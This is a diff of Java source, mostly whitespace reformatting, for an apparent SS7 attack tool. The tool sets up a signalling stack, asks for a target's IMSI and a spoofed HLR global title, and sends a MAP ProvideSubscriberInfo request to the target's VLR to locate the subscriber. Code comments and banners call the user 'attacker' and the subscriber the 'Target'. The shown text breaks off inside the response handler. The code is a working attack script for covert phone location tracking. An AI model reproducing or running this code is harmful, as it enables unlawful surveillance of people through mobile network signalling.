@@ -124,56 +124,56 @@ abstract class PSILowLevel implements MAPDialogListener, MAPServiceCallHandlingL
 
     protected PSILowLevel() {
 
-	init();
+        init();
     }
 
     public void init() {
-	try {
+        try {
 
-	    Scanner user_input = new Scanner(System.in);
+            Scanner user_input = new Scanner(System.in);
 
-	    System.out.print("\033[34m[*]\033[0mSet Client PC: ");
-	    CLIENT_SPC = user_input.nextInt();
-	    System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
-	    SERVER_SPC = user_input.nextInt();
+            System.out.print("\033[34m[*]\033[0mSet Client PC: ");
+            CLIENT_SPC = user_input.nextInt();
+            System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
+            SERVER_SPC = user_input.nextInt();
 
-	    System.out.print("\033[34m[*]\033[0mSet Client IP: ");
-	    CLIENT_IP = user_input.next();
-	    System.out.print("\033[34m[*]\033[0mSet Client Port: ");
-	    CLIENT_PORT = user_input.nextInt();
-	    System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
-	    SERVER_IP = user_input.next();
-	    System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
-	    SERVER_PORT = user_input.nextInt();
+            System.out.print("\033[34m[*]\033[0mSet Client IP: ");
+            CLIENT_IP = user_input.next();
+            System.out.print("\033[34m[*]\033[0mSet Client Port: ");
+            CLIENT_PORT = user_input.nextInt();
+            System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
+            SERVER_IP = user_input.next();
+            System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
+            SERVER_PORT = user_input.nextInt();
 
-	    System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
-	    NETWORK_INDICATOR = user_input.nextInt();
+            System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
+            NETWORK_INDICATOR = user_input.nextInt();
 
-	    System.out.print("\033[34m[*]\033[0mSet Remote VLR GT: ");
-	    VLR = user_input.next();
+            System.out.print("\033[34m[*]\033[0mSet Remote VLR GT: ");
+            VLR = user_input.next();
 
-	    while (true) {
-		System.out.print("\033[34m[*]\033[0mSet Target's IMSI: ");
-		IMSI = user_input.next();
-		if (IMSI.length() == 15 || IMSI.length() == 16) {
-		    break;
-		} else {
-		    System.out.println(
-			    "\033[31m[-]\033[0mWrong Format: IMSI must be 15 or 16 digits, please refer to the country's format");
-		}
-	    }
+            while (true) {
+                System.out.print("\033[34m[*]\033[0mSet Target's IMSI: ");
+                IMSI = user_input.next();
+                if (IMSI.length() == 15 || IMSI.length() == 16) {
+                    break;
+                } else {
+                    System.out.println(
+                            "\033[31m[-]\033[0mWrong Format: IMSI must be 15 or 16 digits, please refer to the country's format");
+                }
+            }
 
-	    System.out.print("\033[34m[*]\033[0mSet your HLR GT: ");
-	    HLR = user_input.next();
+            System.out.print("\033[34m[*]\033[0mSet your HLR GT: ");
+            HLR = user_input.next();
 
-	    System.out.println("\033[34m[*]\033[0mStack components are set...");
-	    System.out.println("\033[34m[*]\033[0mInitializing the Stack...");
+            System.out.println("\033[34m[*]\033[0mStack components are set...");
+            System.out.println("\033[34m[*]\033[0mInitializing the Stack...");
 
-	} catch (Exception ex) {
-	    System.out.println("\033[31m[-]\033[0mError: " + ex.getMessage());
-	    System.exit(1);
+        } catch (Exception ex) {
+            System.out.println("\033[31m[-]\033[0mError: " + ex.getMessage());
+            System.exit(1);
 
-	}
+        }
 
     }
 }
@@ -201,307 +201,307 @@ public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPS
     private MAPProvider mapProvider;
 
     public ProvideSubscriberInformationReq() {
-	// TODO Auto-generated constructor stub
+        // TODO Auto-generated constructor stub
     }
 
     protected void initializeStack(IpChannelType ipChannelType) throws Exception {
 
-	this.initSCTP(ipChannelType);
+        this.initSCTP(ipChannelType);
 
-	// Initialize M3UA first
-	this.initM3UA();
+        // Initialize M3UA first
+        this.initM3UA();
 
-	// Initialize SCCP
-	this.initSCCP();
+        // Initialize SCCP
+        this.initSCCP();
 
-	// Initialize TCAP
-	this.initTCAP();
+        // Initialize TCAP
+        this.initTCAP();
 
-	// Initialize MAP
-	this.initMAP();
+        // Initialize MAP
+        this.initMAP();
 
-	// FInally start ASP
-	// Set 5: Finally start ASP
-	this.clientM3UAMgmt.startAsp("ASP1");
+        // FInally start ASP
+        // Set 5: Finally start ASP
+        this.clientM3UAMgmt.startAsp("ASP1");
     }
 
     private void initSCTP(IpChannelType ipChannelType) throws Exception {
-	System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
-	try {
-	    this.sctpManagement = new ManagementImpl("Client");
-	    this.sctpManagement.setSingleThread(true);
-	    this.sctpManagement.start();
-	    this.sctpManagement.setConnectDelay(10000);
-	    this.sctpManagement.removeAllResourses();
+        System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
+        try {
+            this.sctpManagement = new ManagementImpl("Client");
+            this.sctpManagement.setSingleThread(true);
+            this.sctpManagement.start();
+            this.sctpManagement.setConnectDelay(10000);
+            this.sctpManagement.removeAllResourses();
 
-	    // 1. Create SCTP Association
-	    sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
-		    ipChannelType, null);
+            // 1. Create SCTP Association
+            sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
+                    ipChannelType, null);
 
-	    System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
-	} catch (Exception e) {
-	    System.out.println("\033[31m[-]\033[0mError initializing SCTP Stack: " + e.getMessage());
-	    System.exit(2);
-	}
+            System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
+        } catch (Exception e) {
+            System.out.println("\033[31m[-]\033[0mError initializing SCTP Stack: " + e.getMessage());
+            System.exit(2);
+        }
     }
 
     private void initM3UA() throws Exception {
-	System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
-	this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
-	this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
-	this.clientM3UAMgmt.start();
-	this.clientM3UAMgmt.removeAllResourses();
+        System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
+        this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
+        this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
+        this.clientM3UAMgmt.start();
+        this.clientM3UAMgmt.removeAllResourses();
 
-	// m3ua as create rc <rc> <ras-name>
-	RoutingContext rc = factory.createRoutingContext(new long[] { 100l });
-	TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);
+        // m3ua as create rc <rc> <ras-name>
+        RoutingContext rc = factory.createRoutingContext(new long[]{100l});
+        TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);
 
-	try {
-	    this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
-		    trafficModeType, 1, null);
+        try {
+            this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
+                    trafficModeType, 1, null);
 
-	    // Step 2 : Create ASP
-	    this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);
+            // Step 2 : Create ASP
+            this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);
 
-	    // Step3 : Assign ASP to AS
-	    AspImpl asp = this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");
+            // Step3 : Assign ASP to AS
+            AspImpl asp = this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");
 
-	    // Step 4: Add Route.
-	    clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");
-	    System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
-	} catch (Exception e) {
-	    System.out.println("\033[31m[-]\033[0mError initializing M3UA Stack: " + e.getMessage());
-	    System.exit(3);
+            // Step 4: Add Route.
+            clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");
+            System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
+        } catch (Exception e) {
+            System.out.println("\033[31m[-]\033[0mError initializing M3UA Stack: " + e.getMessage());
+            System.exit(3);
 
-	}
+        }
 
     }
 
     private void initSCCP() throws Exception {
-	System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
-	try {
-	    this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
-	    this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);
+        System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
+        try {
+            this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
+            this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);
 
-	    this.sccpStack.start();
-	    this.sccpStack.removeAllResourses();
+            this.sccpStack.start();
+            this.sccpStack.removeAllResourses();
 
-	    this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
-	    this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);
+            this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
+            this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);
 
-	    this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);
+            this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);
 
-	    this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);
+            this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);
 
-	    this.sccpProvider = this.sccpStack.getSccpProvider();
+            this.sccpProvider = this.sccpStack.getSccpProvider();
 
-	    // SCCP routing table
-	    GlobalTitle0100 remoteVLR = this.sccpProvider.getParameterFactory().createGlobalTitle(VLR, 0,
-		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
-		    NatureOfAddress.INTERNATIONAL);
-	    GlobalTitle0100 localHLRGT = this.sccpProvider.getParameterFactory().createGlobalTitle(HLR, 0,
-		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
-		    NatureOfAddress.INTERNATIONAL);
+            // SCCP routing table
+            GlobalTitle0100 remoteVLR = this.sccpProvider.getParameterFactory().createGlobalTitle(VLR, 0,
+                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
+                    NatureOfAddress.INTERNATIONAL);
+            GlobalTitle0100 localHLRGT = this.sccpProvider.getParameterFactory().createGlobalTitle(HLR, 0,
+                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
+                    NatureOfAddress.INTERNATIONAL);
 
-	    this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
-		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server));
+            this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
+                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server));
 
-	    this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
-		    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localHLRGT, CLIENT_SPC, SSN_Client));
+            this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
+                    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localHLRGT, CLIENT_SPC, SSN_Client));
 
-	    SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
-		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server);
-	    SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
-		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localHLRGT, CLIENT_SPC, SSN_Client);
+            SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
+                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server);
+            SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
+                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localHLRGT, CLIENT_SPC, SSN_Client);
 
-	    String maskRemote = "K";
-	    String maskLocal = "R";
+            String maskRemote = "K";
+            String maskLocal = "R";
 
-	    // translate local GT to its POC+SSN (local rule)GTT
-	    this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
-		    maskRemote, 1, -1, null, 0, null);
-	    this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
-		    maskLocal, 2, -1, null, 0, null);
-	    System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
+            // translate local GT to its POC+SSN (local rule)GTT
+            this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
+                    maskRemote, 1, -1, null, 0, null);
+            this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
+                    maskLocal, 2, -1, null, 0, null);
+            System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
 
-	} catch (Exception e) {
-	    System.out.println("\033[31m[-]\033[0mError initializing SCCP Stack: " + e.getMessage());
-	    System.exit(4);
-	}
+        } catch (Exception e) {
+            System.out.println("\033[31m[-]\033[0mError initializing SCCP Stack: " + e.getMessage());
+            System.exit(4);
+        }
 
     }
 
     private void initTCAP() throws Exception {
-	System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
-	try {
-	    this.tcapStack = new TCAPStackImpl("PSI", this.sccpStack.getSccpProvider(), SSN_Client);
-	    this.tcapStack.start();
-	    this.tcapStack.setDialogIdleTimeout(60000);
-	    this.tcapStack.setInvokeTimeout(30000);
-	    this.tcapStack.setMaxDialogs(2000);
-	    System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
-	} catch (Exception e) {
-	    System.out.println("\033[31m[-]\033[0mError initializing TCAP Stack: " + e.getMessage());
-	    System.exit(5);
-	}
+        System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
+        try {
+            this.tcapStack = new TCAPStackImpl("PSI", this.sccpStack.getSccpProvider(), SSN_Client);
+            this.tcapStack.start();
+            this.tcapStack.setDialogIdleTimeout(60000);
+            this.tcapStack.setInvokeTimeout(30000);
+            this.tcapStack.setMaxDialogs(2000);
+            System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
+        } catch (Exception e) {
+            System.out.println("\033[31m[-]\033[0mError initializing TCAP Stack: " + e.getMessage());
+            System.exit(5);
+        }
     }
 
     private void initMAP() throws Exception {
-	System.out.println("\033[34m[*]\033[0mInitializing MAAP Stack ....");
-	try {
+        System.out.println("\033[34m[*]\033[0mInitializing MAAP Stack ....");
+        try {
 
-	    this.mapStack = new MAPStackImpl("MAP-HLR", this.tcapStack.getProvider());
-	    this.mapProvider = this.mapStack.getMAPProvider();
+            this.mapStack = new MAPStackImpl("MAP-HLR", this.tcapStack.getProvider());
+            this.mapProvider = this.mapStack.getMAPProvider();
 
-	    this.mapProvider.addMAPDialogListener(this);
-	    this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);
+            this.mapProvider.addMAPDialogListener(this);
+            this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);
 
-	    this.mapProvider.getMAPServiceMobility().acivate();
+            this.mapProvider.getMAPServiceMobility().acivate();
 
-	    this.mapStack.start();
-	    System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");
+            this.mapStack.start();
+            System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");
 
-	} catch (Exception e) {
-	    System.out.println("\033[31m[-]\033[0mError initializing MAP Stack: " + e.getMessage());
-	    System.exit(6);
-	}
+        } catch (Exception e) {
+            System.out.println("\033[31m[-]\033[0mError initializing MAP Stack: " + e.getMessage());
+            System.exit(6);
+        }
 
     }
 
     private void initiatePSI() throws MAPException {
 
-	// Create of the target IMSI
-	IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(IMSI);
+        // Create of the target IMSI
+        IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(IMSI);
 
-	// Creating Requested information to be gathered from target VLR
-	RequestedInfo requestedInfo = this.mapProvider.getMAPParameterFactory().createRequestedInfo(true, true, null,
-		true, DomainType.csDomain, true, false, false);
+        // Creating Requested information to be gathered from target VLR
+        RequestedInfo requestedInfo = this.mapProvider.getMAPParameterFactory().createRequestedInfo(true, true, null,
+                true, DomainType.csDomain, true, false, false);
 
-	System.out.println("\033[34m[*]\033[0mLocating Target: " + imsi.getData());
+        System.out.println("\033[34m[*]\033[0mLocating Target: " + imsi.getData());
 
-	// Creating the GT for the target VLR
-	GlobalTitle0100 gtVLR = this.sccpProvider.getParameterFactory().createGlobalTitle(VLR, 0,
-		org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
-		NatureOfAddress.INTERNATIONAL);
+        // Creating the GT for the target VLR
+        GlobalTitle0100 gtVLR = this.sccpProvider.getParameterFactory().createGlobalTitle(VLR, 0,
+                org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
+                NatureOfAddress.INTERNATIONAL);
 
-	// Creating the GT for Querying HLR
-	GlobalTitle0100 gtHLR = this.sccpProvider.getParameterFactory().createGlobalTitle(HLR, 0,
-		org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
-		NatureOfAddress.INTERNATIONAL);
+        // Creating the GT for Querying HLR
+        GlobalTitle0100 gtHLR = this.sccpProvider.getParameterFactory().createGlobalTitle(HLR, 0,
+                org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
+                NatureOfAddress.INTERNATIONAL);
 
-	SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory()
-		.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtHLR, CLIENT_SPC, SSN_Client);
+        SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory()
+                .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtHLR, CLIENT_SPC, SSN_Client);
 
-	SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory()
-		.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtVLR, SERVER_SPC, SSN_Server);
+        SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory()
+                .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtVLR, SERVER_SPC, SSN_Server);
 
-	// First create Dialog
-	MAPDialogMobility mapDialog = this.mapProvider.getMAPServiceMobility().createNewDialog(
-		MAPApplicationContext.getInstance(MAPApplicationContextName.subscriberInfoEnquiryContext,
-			MAPApplicationContextVersion.version3),
-		callingParty, null, calledParty, null);
+        // First create Dialog
+        MAPDialogMobility mapDialog = this.mapProvider.getMAPServiceMobility().createNewDialog(
+                MAPApplicationContext.getInstance(MAPApplicationContextName.subscriberInfoEnquiryContext,
+                        MAPApplicationContextVersion.version3),
+                callingParty, null, calledParty, null);
 
-	mapDialog.addProvideSubscriberInfoRequest(imsi, null, requestedInfo, null, null);
+        mapDialog.addProvideSubscriberInfoRequest(imsi, null, requestedInfo, null, null);
 
-	// This will initiate the TC-BEGIN with INVOKE component
-	try {
-	    mapDialog.send();
-	    System.out.println(
-		    "\033[34m[*]\033[0mLocation Retrieval for Target " + imsi.getData() + " is processing..\n");
-	} catch (MAPException e) {
-	    System.out.println("\033[31m[-]\033[0mMAP Error: " + e.getMessage());
-	    System.exit(7);
-	}
+        // This will initiate the TC-BEGIN with INVOKE component
+        try {
+            mapDialog.send();
+            System.out.println(
+                    "\033[34m[*]\033[0mLocation Retrieval for Target " + imsi.getData() + " is processing..\n");
+        } catch (MAPException e) {
+            System.out.println("\033[31m[-]\033[0mMAP Error: " + e.getMessage());
+            System.exit(7);
+        }
     }
 
     public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
-	if (logger.isDebugEnabled()) {
-	    logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s",
-		    mapDialog.getLocalDialogId(), extensionContainer));
-	}
+        if (logger.isDebugEnabled()) {
+            logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s",
+                    mapDialog.getLocalDialogId(), extensionContainer));
+        }
     }
 
     public void onDialogClose(MAPDialog mapDialog) {
-	if (logger.isDebugEnabled()) {
-	    logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
-	}
+        if (logger.isDebugEnabled()) {
+            logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
+        }
 
     }
 
     public void onDialogDelimiter(MAPDialog mapDialog) {
-	if (logger.isDebugEnabled()) {
-	    logger.debug(String.format("onDialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
-	}
+        if (logger.isDebugEnabled()) {
+            logger.debug(String.format("onDialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
+        }
     }
 
     public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
-	System.err.printf("[-]Error: onDialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s ",
-		mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
-	System.exit(8);
+        System.err.printf("[-]Error: onDialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s ",
+                mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
+        System.exit(8);
     }
 
     public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
-	    MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
-	System.err.printf(
-		"[-]Error: onDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s",
-		mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
-	System.exit(9);
+                                      MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
+        System.err.printf(
+                "[-]Error: onDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s",
+                mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
+        System.exit(9);
     }
 
     public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
-	    ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
-	System.err.printf(
-		"[-]Error: onDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s",
-		mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
-	System.exit(10);
+                               ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
+        System.err.printf(
+                "[-]Error: onDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s",
+                mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
+        System.exit(10);
     }
 
     public void onDialogRelease(MAPDialog mapDialog) {
-	if (logger.isDebugEnabled()) {
-	    logger.debug(String.format("[-]Error: onDialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
-	}
+        if (logger.isDebugEnabled()) {
+            logger.debug(String.format("[-]Error: onDialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
+        }
     }
 
     public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
-	    MAPExtensionContainer extensionContainer) {
-	if (logger.isDebugEnabled()) {
-	    logger.debug(String.format(
-		    "[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s",
-		    mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
-	}
+                                MAPExtensionContainer extensionContainer) {
+        if (logger.isDebugEnabled()) {
+            logger.debug(String.format(
+                    "[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s",
+                    mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
+        }
     }
 
     @Override
     public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
-	    AddressString addressString2, AddressString addressString3) {
+                                        AddressString addressString2, AddressString addressString3) {
 
     }
 
     public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
-	    IMSI arg3, AddressString arg4) {
-	if (logger.isDebugEnabled()) {
-	    logger.debug(String.format(
-		    "[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s ",
-		    mapDialog.getLocalDialogId(), destReference, origReference));
-	}
+                                        IMSI arg3, AddressString arg4) {
+        if (logger.isDebugEnabled()) {
+            logger.debug(String.format(
+                    "[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s ",
+                    mapDialog.getLocalDialogId(), destReference, origReference));
+        }
     }
 
     public void onDialogTimeout(MAPDialog mapDialog) {
-	System.err.printf("[-]Error: onDialogTimeout for DialogId=%d", mapDialog.getLocalDialogId());
-	System.exit(11);
+        System.err.printf("[-]Error: onDialogTimeout for DialogId=%d", mapDialog.getLocalDialogId());
+        System.exit(11);
     }
 
     public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
-	    MAPExtensionContainer extensionContainer) {
-	System.err.printf("[-]Error: onDialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s",
-		mapDialog.getLocalDialogId(), userReason, extensionContainer);
-	System.exit(12);
+                                  MAPExtensionContainer extensionContainer) {
+        System.err.printf("[-]Error: onDialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s",
+                mapDialog.getLocalDialogId(), userReason, extensionContainer);
+        System.exit(12);
     }
 
     public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
-	System.err.printf("[-]Error: onErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s",
-		mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
-	System.exit(13);
+        System.err.printf("[-]Error: onErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s",
+                mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
+        System.exit(13);
     }
 
     @Override
@@ -510,46 +510,46 @@ public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPS
     }
 
     public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {
-	System.err.printf("[-]Error: onInvokeTimeout for Dialog=%d and invokeId=%d", mapDialog.getLocalDialogId(),
-		invokeId);
-	System.exit(14);
+        System.err.printf("[-]Error: onInvokeTimeout for Dialog=%d and invokeId=%d", mapDialog.getLocalDialogId(),
+                invokeId);
+        System.exit(14);
     }
 
     public void onMAPMessage(MAPMessage mapMessage) {
-	// TODO Auto-generated method stub
+        // TODO Auto-generated method stub
     }
 
     public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {
-	System.err.printf("onProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s",
-		mapDialog.getLocalDialogId(), invokeId);
-	System.exit(15);
+        System.err.printf("onProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s",
+                mapDialog.getLocalDialogId(), invokeId);
+        System.exit(15);
     }
 
     public void onRejectComponent(MAPDialog mapDialog, Long invokeId, Problem problem) {
-	System.err.printf("onRejectComponent for Dialog=%d and invokeId=%d Problem=%s", mapDialog.getLocalDialogId(),
-		invokeId, problem);
-	System.exit(16);
+        System.err.printf("onRejectComponent for Dialog=%d and invokeId=%d Problem=%s", mapDialog.getLocalDialogId(),
+                invokeId, problem);
+        System.exit(16);
     }
 
     public static void main(String args[]) {
-	System.out.println("*********************************************");
-	System.out.println("***        Locating Target                ***");
-	System.out.println("*********************************************");
-	IpChannelType ipChannelType = IpChannelType.SCTP;
+        System.out.println("*********************************************");
+        System.out.println("***        Locating Target                ***");
+        System.out.println("*********************************************");
+        IpChannelType ipChannelType = IpChannelType.SCTP;
 
-	final ProvideSubscriberInformationReq attacker = new ProvideSubscriberInformationReq();
+        final ProvideSubscriberInformationReq attacker = new ProvideSubscriberInformationReq();
 
-	try {
-	    attacker.initializeStack(ipChannelType);
+        try {
+            attacker.initializeStack(ipChannelType);
 
-	    // Lets pause for 20 seconds so stacks are initialized properly
-	    Thread.sleep(20000);
-	    attacker.initiatePSI();
+            // Lets pause for 20 seconds so stacks are initialized properly
+            Thread.sleep(20000);
+            attacker.initiatePSI();
 
-	} catch (Exception e) {
-	    System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
-	    System.exit(17);
-	}
+        } catch (Exception e) {
+            System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
+            System.exit(17);
+        }
     }
 
     @Override
@@ -559,74 +559,101 @@ public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPS
 
     @Override
     public void onProvideSubscriberInfoResponse(ProvideSubscriberInfoResponse provideSubscriberInfoResponse) {
-	try {
 
-	    IMEI imei = provideSubscriberInfoResponse.getSubscriberInfo().getIMEI();
